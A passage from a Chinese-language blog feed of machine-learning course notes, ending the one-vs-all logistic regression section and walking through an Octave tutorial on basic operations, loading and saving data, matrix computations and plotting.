src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214904.png" alt></p><p>最后我们得到一系列的模型简记为： $h_\theta^{\left( i \right)}\left( x \right)=p\left( y=i|x;\theta  \right)$其中：$i=\left( 1,2,3....k \right)$</p><p>最后，在我们需要做预测时，我们将所有的分类机都运行一遍，然后对每一个输入变量，都选择最高可能性的输出变量。</p><p>总之，我们已经把要做的做完了，现在要做的就是训练这个逻辑回归分类器：$h_\theta^{\left( i \right)}\left( x \right)$， 其中 $i$ 对应每一个可能的 $y=i$，最后，<strong>为了做出预测，我们给出输入一个新的 $x$ 值，用这个做预测。我们要做的就是在我们三个分类器里面输入 $x$，然后我们选择一个让 $h_\theta^{\left( i \right)}\left( x \right)$ 最大的$i$</strong>，即$\mathop{\max}\limits_i\,h_\theta^{\left( i \right)}\left( x \right)$。</p><p>你现在知道了基本的挑选分类器的方法，选择出哪一个分类器是可信度最高效果最好的，那么就可认为得到一个正确的分类，无论$i$值是多少，我们都有最高的概率值，我们预测$y$就是那个值。这就是多类别分类问题，以及一对多的方法，通过这个小方法，你现在也可以将逻辑回归分类器用在多类分类的问题上。</p></0$>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑回归 </tag>
            
            <tag> Logistic Regression </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五章-Octave教程</title>
      <link href="/2019/02/12/di-wu-zhang-octave-jiao-cheng/"/>
      <url>/2019/02/12/di-wu-zhang-octave-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="第五章-Octave教程"><a href="#第五章-Octave教程" class="headerlink" title="第五章 Octave教程"></a>第五章 Octave教程</h1><h3 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1. 基本操作"></a>1. 基本操作</h3><p>启动Octave：</p><p>现在打开Octave，这是Octave命令行。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211208.png" alt></p><p>现在让我示范最基本的Octave代码：</p><a id="more"></a><p>输入5 + 6，然后得到11。</p><p>输入3 – 2、5×8、1/2、2^6等等，得到相应答案。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211223.png" alt></p><p>这些都是基本的数学运算。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211239.png" alt></p><p>你也可以做逻辑运算，例如 1==2，计算结果为 false ( 假)，这里的百分号命令表示注释，1==2 计算结果为假，这里用0表示。</p><p>请注意，<code>不等于</code>符号的写法是这个波浪线加上等于符号 <code>( ~= )</code>，而不是等于感叹号加等号( != )，这是和其他一些编程语言中不太一样的地方。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211251.png" alt></p><p>让我们看看逻辑运算 1 &amp;&amp; 0，使用双&amp;符号表示逻辑与，1 &amp;&amp; 0判断为假，1和0的或运算 1 || 0，其计算结果为真。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211304.png" alt></p><p>还有<code>异或</code>运算 如<code>XOR ( 1, 0 )</code>，其返回值为1</p><p>从左向右写着 Octave 324.x版本，是默认的Octave提示，它显示了当前Octave的版本，以及相关的其它信息。</p><p>如果你不想看到那个提示，这里有一个隐藏的命令</p><p>输入命令</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211323.png" alt></p><p>现在命令提示已经变得简化了。</p><p>接下来，我们将谈到Octave的变量。</p><p>现在写一个变量，对变量A赋值为3，并按下回车键，显示变量A等于3。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211332.png" alt></p><p>如果你想分配一个变量，但不希望在屏幕上显示结果，你可以<strong>在命令后加一个分号，可以抑制打印输出</strong>，敲入回车后，不打印任何东西。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211343.png" alt></p><p>其中这句命令不打印任何东西。</p><p>现在举一个字符串的例子：变量b等于”hi”。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211355.png" alt></p><p>C等于3大于等于1，所以，现在C变量的值是真。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211404.png" alt></p><p>如果你想打印出变量，或显示一个变量，你可以像下面这么做：</p><p>设置A等于圆周率π，如果我要打印该值，那么只需键入A像这样 就打印出来了。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211412.png" alt></p><p>对于更复杂的屏幕输出，也可以用DISP命令显示：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211424.png" alt></p><p>这是一种，旧风格的C语言语法，对于之前就学过C语言的同学来说，你可以使用这种基本的语法来将结果打印到屏幕。</p><p>例如 sprintf命令的六个小数：0.6%f ,a，这应该打印π的6位小数形式。</p><p>也有一些控制输出长短格式的快捷命令：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211435.png" alt></p><p>下面，让我们来看看向量和矩阵：</p><p>比方说 建立一个矩阵A</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211447.png" alt></p><p>对A矩阵进行赋值</p><p>考虑到这是一个三行两列的矩阵</p><p>你同样可以用向量</p><p>建立向量V并赋值1 2 3，V是一个行向量，或者说是一个3 ( 列 )×1 ( 行 )<br>的向量，或者说，一行三列的矩阵。</p><p>如果我想，分配一个列向量，我可以写“1;2;3”，现在便有了一个3 行 1 列<br>的向量，同时这是一个列向量。</p><p>下面是一些更为有用的符号，如：</p><pre class=" language-matlab"><code class="language-matlab">V<span class="token operator">=</span><span class="token number">1</span>：<span class="token number">0.1</span>：<span class="token number">2</span></code></pre><p>这个该如何理解呢：这个集合V是一组值，从数值1开始，增量或说是步长为0.1，直到增加到2，按照这样的方法对向量V操作，可以得到一个行向量，这是一个1行11列的矩阵，其矩阵的元素是1<br>1.1 1.2 1.3，依此类推，直到数值2。</p><p>我也可以建立一个集合V并用命令“1:6”进行赋值，这样V就被赋值了1至6的六个整数。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211511.png" alt></p><p>这里还有一些其他的方法来生成矩阵</p><p>例如“<code>ones(2, 3)</code>”，也可以用来生成<code>全是1的矩阵</code>：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211526.png" alt></p><p>元素都为2，两行三列的矩阵，就可以使用这个命令：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211539.png" alt></p><p>你可以把这个方法当成一个生成矩阵的快速方法。</p><p>w为一个一行三列的零矩阵，一行三列的A矩阵里的元素全部是零：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211550.png" alt></p><p>还有很多的方式来生成矩阵。</p><p>如果我对W进行赋值，用Rand命令建立一个一行三列的矩阵，因为使用了Rand命令，则其一行三列的元素均为随机值，如“<code>rand(3,3)</code>”命令，这就生成了一个3×3的矩阵，并且其所有元素均为随机。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211603.png" alt></p><p><strong>数值介于0和1之间</strong>，所以，正是因为这一点，我们可以得到数值均匀介于0和1之间的元素。</p><p>如果，你知道什么是高斯随机变量，或者，你知道什么是正态分布的随机变量，你可以设置集合W，使其等于一个一行三列的N矩阵，并且，来自三个值，一个平均值为0的高斯分布，方差或者等于1的标准偏差。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211615.png" alt></p><p>还可以设置地更复杂：</p><p>并用<code>hist</code>命令<code>绘制直方图</code>。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211633.png" alt></p><p>绘制<code>单位矩阵</code>：<code>eye(6)</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211642.png" alt></p><p>如果对命令不清楚，建议用<code>help</code>命令：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211651.png" alt></p><p>以上讲解的内容都是Octave的基本操作。希望你能通过上面的讲解，自己练习一些矩阵、乘、加等操作，将这些操作在Octave中熟练运用。</p><p>在接下来的视频中，将会涉及更多复杂的命令，并使用它们在Octave中对数据进行更多的操作。</p><h3 id="2-移动数据"><a href="#2-移动数据" class="headerlink" title="2. 移动数据"></a>2. 移动数据</h3><p>在这段关于 Octave的辅导课视频中，我将开始介绍如何在 Octave 中移动数据。</p><p>如果你有一个机器学习问题，你怎样把数据加载到 Octave 中？</p><p>怎样把数据存入一个矩阵？</p><p>如何对矩阵进行相乘？</p><p>如何保存计算结果？</p><p>如何移动这些数据并用数据进行操作？</p><p>进入我的 Octave 窗口，</p><p>我键入 A，得到我们之前构建的矩阵 A，也就是用这个命令生成的：</p><p><code>A = [1 2; 3 4; 5 6]</code></p><p>这是一个3行2列的矩阵，Octave 中的 <code>size()</code> 命令<code>返回矩阵的尺寸</code>。</p><p>所以 <code>size(A)</code> 命令返回3 2</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211712.png" alt></p><p>实际上，size() 命令返回的是一个 1×2 的矩阵，我们可以用 sz 来存放。</p><p>设置 sz = size(A)</p><p>因此 sz 就是一个1×2的矩阵，第一个元素是3，第二个元素是2。</p><p>所以如果键入 <code>size(sz)</code> 看看 sz 的尺寸，返回的是<code>1 2</code>，表示是一个<code>1×2的矩阵</code>，1 和 2分别表示矩阵sz的维度 。</p><p>你也可以键入 <code>size(A, 1)</code>，将返回3，这个命令会返回A 矩阵的第一个元素，A矩阵的第一个维度的尺寸，也就是 A <code>矩阵的行数</code>。</p><p>同样，命令 <code>size(A, 2)</code>，将返回2，也就是 A 矩阵的列数。</p><p>如果你有一个向量 v，假如 <code>v = [1 2 3 4]</code>，然后键入<code>length(v)</code>，这个命令将返回最大维度的大小，返回4。</p><p>你也可以键入 length(A)，由于矩阵A是一个3×2的矩阵，因此最大的维度应该是3，因此该命令会返回3。</p><p>但<strong>通常我们还是对<code>向量</code>使用 <code>length</code> 命令</strong>，而不是对矩阵使用 length 命令，比如<br><code>length([1;2;3;4;5])</code>，返回5。</p><p>如何在系统中加载数据和寻找数据：</p><p>当我们打开 Octave 时，我们通常已经在一个默认路径中，这个路径是 Octave的安装位置，pwd 命令可以显示出Octave 当前所处路径。</p><p><code>cd</code><br>命令，意思是改变路径，我可以把路径改为C:\Users\ang\Desktop，这样当前目录就变为了桌面。</p><p>如果键入 ls，ls 来自于一个 Unix 或者 Linux 命令，ls<br>命令将列出我桌面上的所有路径。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211725.png" alt></p><p>事实上，我的桌面上有两个文件：featuresX.dat 和priceY.dat，是两个我想解决的机器学习问题。</p><p><code>featuresX</code><br>文件如这个窗口所示，是一个含有两列数据的文件，其实就是我的房屋价格数据，数据集中有47行，第一个房子样本，面积是2104平方英尺，有3个卧室，第二套房子面积为1600，有3个卧室等等。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211742.png" alt></p><p>priceY这个文件就是训练集中的价格数据，所以 featuresX 和priceY<br>就是两个存放数据的文档，那么应该怎样把数据读入 Octave 呢？我们只需要键入featuresX.dat，这样我将加载了 featuresX 文件。同样地我可以加载priceY.dat。其实有好多种办法可以完成，如果你把命令写成字符串的形式<br><code>load(&#39;featureX.dat&#39;)</code>，也是可以的，这跟刚才的命令效果是相同的，只不过是把文件名写成了一个字符串的形式，现在文件名被存在一个字符串中。Octave中使用引号来表示字符串。</p><p>另外 <code>who</code> 命令，能显示出 在我的 <code>Octave工作空间中的所有变量</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211750.png" alt></p><p>所以我可以键入featuresX 回车，来显示 featuresX</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211803.png" alt></p><p>这些就是存在里面的数据。</p><p>还可以键入 <code>size(featuresX)</code>，得出的结果是 47 2，代表这是一个47×2的矩阵。</p><p>类似地，输入 <code>size(priceY)</code>，结果是 47<br>1，表示这是一个47维的向量，是一个列矩阵，存放的是训练集中的所有价格 Y 的值。</p><p>who 函数能让你看到当前工作空间中的所有变量，同样还有另一个 <code>whos</code>命令，能更详细地进行查看。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211839.png" alt></p><p>同样也列出我所有的变量，不仅如此，还列出了变量的维度。</p><p>double 意思是双精度浮点型，这也就是说，这些数都是实数，是浮点数。</p><p>如果你想删除某个变量，你可以使用 <code>clear</code> 命令，我们键入 <code>clear featuresX</code>，然后再输入 <code>whos</code> 命令，你会发现 featuresX 消失了。</p><p>另外，我们怎么储存数据呢？</p><p>我们设变量 <code>v= priceY(1:10)</code></p><p>这表示的是<strong>将向量 Y 的前10个元素存入 v 中</strong>。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211851.png" alt></p><p>假如我们想把它存入硬盘，那么用 <code>save hello.mat v</code> 命令，这个命令会将变量v存成一个叫 hello.mat 的文件，让我们回车，现在我的桌面上就出现了一个新文件，名为hello.mat。</p><p>由于我的电脑里同时安装了 MATLAB，所以这个图标上面有 MATLAB的标识，因为操作系统把文件识别为 MATLAB文件。如果在你的电脑上图标显示的不一样的话，也没有关系。</p><p>现在我们清除所有变量，直接键入<code>clear</code>，这样将删除工作空间中的所有变量，所以现在工作空间中啥都没了。</p><p>但如果我载入 hello.mat 文件，我又重新读取了变量 v，因为我之前把变量<br>v存入了hello.mat 文件中，所以我们刚才用 <code>save</code>命令做了什么。这个命令把数据按照二进制形式储存，或者说是更压缩的二进制形式，因此，如果v<br>是很大的数据，那么压缩幅度也更大，占用空间也更小。如果你想把数据存成一个人能看懂的形式，那么可以键入：</p><p><code>save hello.txt v -ascii</code></p><p>这样就会把数据存成一个文本文档，或者将数据的 ascii 码存成文本文档。</p><p>我键入了这个命令以后，我的桌面上就有了 hello.txt文件。如果打开它，我们可以发现这个文本文档存放着我们的数据。</p><p>这就是读取和储存数据的方法。</p><p>接下来我们再来讲讲操作数据的方法：</p><p>假如 A 还是那个矩阵</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211922.png" alt></p><p>跟刚才一样还是那个 3×2 的矩阵，现在我们加上索引值，比如键入 <code>A(3,2)</code></p><p>这将索引到A 矩阵的 (3,2) 元素。这就是我们通常书写矩阵的形式，写成 A 32，3和2分别表示矩阵的第三行和第二列对应的元素，因此也就对应 6。</p><p>我也可以键入<code>A(2,:)</code> 来返回第二行的所有元素，<strong><code>冒号</code>表示该行或该列的所有元素</strong>。</p><p>类似地，如果我键入 <code>A(:,2)</code>，这将返回 A 矩阵第二列的所有元素，这将得到 2 4 6。</p><p>这表示返回A 矩阵的第二列的所有元素。</p><p>你也可以在运算中使用这些较为复杂的索引。</p><p>我再给你展示几个例子，可能你也不会经常使用，但我还是输入给你看 <code>A([1 3],:)</code>，这个命令意思是取 A 矩阵第一个索引值为1或3的元素，也就是说我取的是A矩阵的第一行和第三行的每一列，冒号表示的是取这两行的每一列元素，即：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211931.png" alt></p><p>可能这些比较复杂一点的索引操作你会经常用到。</p><p>我们还能做什么呢？依然是 A 矩阵，<code>A(:,2)</code> 命令返回第二列。</p><p>你也可以为它赋值，我可以取 A 矩阵的第二列，然后将它赋值为10 11 12，我实际上是取出了 A 的第二列，然后把一个列向量[10;11;12]赋给了它，因此现在 A 矩阵的第一列还是 1 3 5，第二列就被替换为 10 11 12。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104211941.png" alt></p><p>接下来一个操作，让我们把 A 设为<code>A = [A, [100, 101,102]]</code>，这样做的结果是在原矩阵的右边附加了一个新的列矩阵，就是把 A矩阵设置为原来的 A 矩阵再在右边附上一个新添加的列矩阵。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212046.png" alt></p><p>最后，还有一个小技巧，如果你就输入 <code>A(:)</code>，这是一个很特别的语法结构，意思是<strong>把 A<br>中的所有元素放入一个单独的列向量</strong>，这样我们就得到了一个 9×1 的向量，这些元素都是<br>A 中的元素排列起来的。</p><p>再来几个例子：</p><p>我还是把 A 重新设为 [1 2; 3 4; 5 6]，我再设一个 B为[11 12; 13 14; 15 16]，我可以新建一个矩阵 C，C = [A B]，这个意思就是把这两个矩阵直接<strong>左右</strong>连在一起，矩阵<br>A 在左边，矩阵 B 在右边，这样组成了 C 矩阵，就是直接把 A 和 B 合起来。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212057.png" alt></p><p>我还可以设<code>C = [A; B]</code>，这里的<strong>分号</strong>表示把分号后面的东西放到下面。所以，<code>[A;B]</code>的作用依然还是把两个矩阵放在一起，只不过现在是<strong>上下排列</strong>，所以现在 A 在上面 B在下面，C 就是一个 6×2 矩阵。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212106.png" alt></p><p>简单地说，<strong>分号的意思就是换到下一行</strong>，所以 C 就包括上面的A，然后换行到下面，然后在下面放上一个 B。</p><p>另外顺便说一下，这个<code>[A B]</code>命令跟 <code>[A, B]</code> 是一样的，这两种写法的结果是相同的。</p><p>通过以上这些操作，希望你现在掌握了怎样构建矩阵，也希望我展示的这些命令能让你很快地学会怎样把矩阵放到一起，怎样取出矩阵，并且把它们放到一起，组成更大的矩阵。</p><p>通过几句简单的代码，Octave能够很方便地很快速地帮助我们组合复杂的矩阵以及对数据进行移动。这就是移动数据这一节课。</p><p>我认为对你来讲，最好的学习方法是，下课后复习一下我键入的这些代码好好地看一看，从课程的网上把代码的副本下载下来，重新好好看看这些副本，然后自己在Octave 中把这些命令重新输一遍，慢慢开始学会使用这些命令。</p><p>当然，没有必要把这些命令都记住，你也不可能记得住。你要做的就是，了解一下你可以用哪些命令，做哪些事。这样在你今后需要编写学习算法时，如果你要找到某个Octave中的命令，你可能回想起你之前在这里学到过，然后你就可以查找课程中提供的程序副本，这样就能很轻松地找到你想使用的命令了。</p><h3 id="5-3-计算数据"><a href="#5-3-计算数据" class="headerlink" title="5.3 计算数据"></a>5.3 计算数据</h3><p>现在，你已经学会了在Octave中如何加载或存储数据，如何把数据存入矩阵等等。在这段视频中，我将介绍如何对数据进行运算，稍后我们将使用这些运算操作来实现我们的学习算法。</p><p>这是我的 Octave窗口，我现在快速地初始化一些变量。比如设置A为一个3×2的矩阵，设置B为一个3 ×2矩阵，设置C为2 × 2矩阵。</p><p>我想算两个矩阵的乘积，比如说 A × C，我只需键入<code>A×C</code>，这是一个 3×2 矩阵乘以 2×2矩阵，得到这样一个3×2矩阵。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212124.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212135.png" alt></p><p>你也可以对每一个元素，做运算 方法是做点乘运算<code>A .\*B</code>，这么做Octave将矩阵 A中的每一个元素与矩阵 B 中的对应元素相乘</p><p><code>A .\* B</code><br>这里第一个元素1乘以11得到11，第二个元素2乘以12得到24，这就是两个矩阵的元素位运算。通常来说，<strong>在Octave中点号一般用来表示元素位运算</strong>。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212144.png" alt></p><p>这里是一个矩阵A，这里我输入<code>A .^ 2</code>，这将对矩阵A中每一个元素平方。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212152.png" alt></p><p>我们设V是一个向量，设V为 [1; 2; 3] 是列向量，你也可以输入<code>1 ./V</code>，得到每一个元素的倒数，所以这样一来，就会分别算出 1/1 1/2 1/3。</p><p>矩阵也可以这样操作，<code>1 ./ A</code> 得到A中每一个元素的倒数。</p><p>同样地，这里的点号还是表示对每一个元素进行操作。</p><p>我们还可以进行求<code>对数</code>运算，也就是对每个元素进行求对数运算。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212207.png" alt></p><p>还有自然数e的幂次运算，就是以e为底，以这些元素为幂的运算。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212216.png" alt></p><p>我还可以用 abs来对 v 的每一个元素求绝对值，当然这里 v都是正数。我们换成另一个这样对每个元素求绝对值，得到的结果就是这些非负的元素。还有–v，给出V中每个元素的相反数，这等价于 -1 乘以 v，一般就直接用 -v<br>就好了，其实就等于 -1*v。</p><p>还有一个技巧，比如说<br>我们想对v中的每个元素都加1，那么我们可以这么做，首先构造一个3行1列的1向量，然后把这个1向量跟原来的向量相加，因此<br>v 向量从[1 2 3] 增至 [2 3 4]。我用了一个，<code>length(v)</code>命令，因此这样一来，<code>ones(length(v) ,1)</code> 就相当于<code>ones(3,1)</code>，然后我做的是<code>v +ones(3,1)</code>，也就是将 v 的各元素都加上这些1，这样就将 v 的每个元素增加了1。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212229.png" alt></p><p>另一种更简单的方法是直接用 <code>v+1</code>，<code>v + 1</code> 也就等于把 v 中的每一个元素都加上1。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212242.png" alt></p><p>现在，让我们来谈谈更多的操作。</p><p>矩阵A 如果你想要求它的转置，那么方法是用A’,将得出 A 的转置矩阵。当然，如果我写<code>(A’)’</code>，也就是 A 转置两次，那么我又重新得到矩阵 A。</p><p>还有一些有用的函数，比如： <code>a=[1 15 2 0.5]</code>，这是一个1行4列矩阵，<code>val=max(a)</code>，这将返回A矩阵中的最大值15。</p><p>我还可以写 <code>[val, ind] =max(a)</code>，这将返回a矩阵中的最大值存入val，以及该值对应的索引，元素15对应的索引值为2<br>存入ind，所以 ind 等于2</p><p>特别注意一下，如果你用命令 <code>max(A)</code>，A是一个矩阵的话，这样做就是对每一列求最大值。</p><p>我们还是用这个例子，这个 a 矩阵<code>a=[1 15 2 0.5]</code>，如果输入<code>a\&lt;3</code>，这将进行逐元素的运算，所以元素小于3的返回1，否则返回0。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212252.png" alt></p><p>因此，返回[1 1 0 1]。也就是说，对a矩阵的每一个元素与3进行比较，然后根据每一个元素与3的大小关系，返回1和0表示真与假。</p><p>如果我写 <code>find(a&lt;3)</code>，这将告诉我a 中的哪些元素是小于3的。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212301.png" alt></p><p>设<code>A = magic(3)</code>，magic 函数将返回一个矩阵，称为<code>魔方阵或幻方 (magic squares)</code>，它们具有以下这样的数学性质：它们所有的行和列和对角线加起来都等于相同的值。</p><p>当然据我所知，这在机器学习里基本用不上，但我可以用这个方法很方便地生成一个3行3列的矩阵，而这个魔方矩阵这神奇的方形屏幕。每一行、每一列、每一个对角线三个数字加起来都是等于同一个数。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212311.png" alt></p><p>在其他有用的机器学习应用中，这个矩阵其实没多大作用。</p><p>如果我输入 <code>[r,c] = find(A\&gt;=7)</code>，这将找出所有A矩阵中大于等于7的元素，因此，r 和c分别表示行和列，这就表示，第一行第一列的元素大于等于7，第三行第二列的元素大于等于7，第二行第三列的元素大于等于7。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212322.png" alt></p><p>顺便说一句，其实我从来都不去刻意记住这个 find 函数，到底是怎么用的，我只需要会用help 函数就可以了，每当我在使用这个函数，忘记怎么用的时候，我就可以用 help函数，键入 <code>help find</code> 来找到帮助文档。</p><p>最后再讲两个内容，一个是求和函数，这是 a 矩阵：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212332.png" alt></p><p>键入 <code>sum(a)</code>，就把 a 中所有元素加起来了。</p><p>如果我想把它们都乘起来，键入 <code>prod(a)</code>，prod 意思是product(乘积)，它将返回这四个元素的乘积。</p><p><code>floor(a)</code> 是向下四舍五入，因此对于 a 中的元素0.5将被下舍入变成0。</p><p>还有 <code>ceil(a)</code>，表示向上四舍五入，所以0.5将上舍入变为最接近的整数，也就是1。</p><p>如果键入 <code>max(rand(3),rand(3))</code>，这样做的结果是返回两个3×3的随机矩阵，并且逐元素比较取最大值。</p><p>假如我输入<code>max(A,[],1)</code>，这样做会得到<code>每一列</code>的最大值。</p><p>所以第一列的最大值就是8，第二列是9，第三列的最大值是7，这里的1表示取A矩阵第一个维度的最大值。</p><p>相对地，如果我键入<code>max(A,[],2)</code>，这将得到<code>每一行</code>的最大值，所以，第一行的最大值是等于8，第二行最大值是7，第三行是9。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212351.png" alt></p><p>所以你可以用这个方法来求得每一行或每一列的最值，另外，你要知道，默认情况下<code>max(A)</code>返回的是<strong>每一列的最大值</strong>，如果你想要找出整个矩阵A的最大值，你可以输入<code>max(max(A))</code>，或者你可以将A 矩阵转成一个向量，然后键入 <code>max(A(:))</code>，这样做就是把 A 当做一个向量，并返回 A向量中的最大值。</p><p>最后，让我们把 A设为一个9行9列的魔方阵，魔方阵具有的特性是每行每列和对角线的求和都是相等的。</p><p>这是一个9×9的魔方阵，我们来求一个 <code>sum(A,1)</code>，这样就得到每一列的总和，这也验证了一个9×9的魔方阵确实每一列加起来都相等，都为369。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212401.png" alt></p><p>现在我们来求每一行的和，键入<code>sum(A,2)</code>，这样就得到了A 中每一行的和加起来还是369。</p><p>现在我们来算A 的对角线元素的和。我们现在构造一个9×9 的单位矩阵，</p><p>键入 <code>eye(9)</code></p><p>设为I9</p><p>然后我们要用 A逐点乘以这个单位矩阵，除了对角线元素外，其他元素都会得到0。</p><p>键入<code>sum(sum(A.\*eye(9))</code></p><p>这实际上是求得了，这个矩阵对角线元素的和确实是369。</p><p>你也可以求另一条对角线的和也是是369。</p><p>flipup/flipud 表示向上/向下翻转。</p><p>同样地，如果你想求这个矩阵的逆矩阵，键入<br><code>pinv(A)</code>，通常称为伪逆矩阵，你就把它看成是矩阵 A 求逆，因此这就是 A<br>矩阵的逆矩阵。</p><p>设 <code>temp = pinv(A)</code>，然后再用temp 乘以 A，这实际上得到的就是单位矩阵，对角线为1，其他元素为0。</p><p>如何对矩阵中的数字进行各种操作，在运行完某个学习算法之后，通常一件最有用的事情是看看你的结果，或者说让你的结果可视化，在接下来的视频中，我会非常迅速地告诉你，如何很快地画图，如何只用一两行代码，你就可以快速地可视化你的数据，这样你就能更好地理解你使用的学习算法。</p><h3 id="5-4-绘图数据"><a href="#5-4-绘图数据" class="headerlink" title="5.4 绘图数据"></a>5.4 绘图数据</h3><p>当开发学习算法时，往往几个简单的图，可以让你更好地理解算法的内容，并且可以完整地检查下算法是否正常运行，是否达到了算法的目的。</p><p>例如在之前的视频中，我谈到了绘制成本函数$J(\theta)$，可以帮助确认梯度下降算法是否收敛。通常情况下，绘制数据或学习算法所有输出，也会启发你如何改进你的学习算法。幸运的是，Octave有非常简单的工具用来生成大量不同的图。当我用学习算法时，我发现绘制数据、绘制学习算法等，往往是我获得想法来改进算法的重要部分。在这段视频中，我想告诉你一些Octave的工具来绘制和可视化你的数据。</p><p>我们先来快速生成一些数据用来绘图。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212429.png" alt></p><p>如果我想绘制正弦函数，这是很容易的，我只需要输入<code>plot(t,y1)</code>，并回车，就出现了这个图：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212448.png" alt></p><p>横轴是t变量，纵轴是y1，也就是我们刚刚所输出的正弦函数。</p><p>让我们设置y2</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212503.png" alt></p><p>Octave将会消除之前的正弦图，并且用这个余弦图来代替它，这里纵轴cos(x)从1开始，</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212512.png" alt></p><p>如果我要同时表示正弦和余弦曲线。</p><p>我要做的就是，输入：<code>plot(t, y1)</code>，得到正弦函数，我使用函数hold on，   <code>hold on</code>函数的功能是<strong>将新的图像绘制在旧的之上</strong></p><p>我现在绘制y2，输入：<code>plot(t, y2)</code>。</p><p>我要以不同的<code>颜色</code>绘制余弦函数，所以我在这里输入带引号的r绘制余弦函数，r表示所使用的颜色：<code>plot(t,y2,’r’)</code>，再加上命令<code>xlabel(&#39;time&#39;)</code>，<br>来标记X轴即水平轴，输入<code>ylabel(&#39;value&#39;)</code>，来标记垂直轴的值。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212527.png" alt></p><p>同时我也可以来标记我的两条函数曲线，用这个命令 <code>legend(&#39;sin&#39;,&#39;cos&#39;)</code>将这个图例放在右上方，表示这两条曲线表示的内容。最后输入<code>title(&#39;myplot&#39;)</code>，在图像的顶部显示这幅图的标题。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212537.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212547.png" alt></p><p>如果你想保存这幅图像，你输入<code>print –dpng &#39;myplot.png&#39;</code>，png是一个图像文件格式，如果你这样做了，它可以让你保存为一个文件。</p><p>Octave也可以保存为很多其他的格式，你可以键入<code>help plot</code>。</p><p>最后如果你想，删掉这个图像，用命令close会让这个图像关掉。</p><p>Octave也可以让你为图像标号</p><p>你键入<code>figure(1); plot(t, y1);</code>将显示第一张图，绘制了变量t y1。</p><p>键入<code>figure(2); plot(t, y2);</code> 将显示第一张图，绘制了变量t 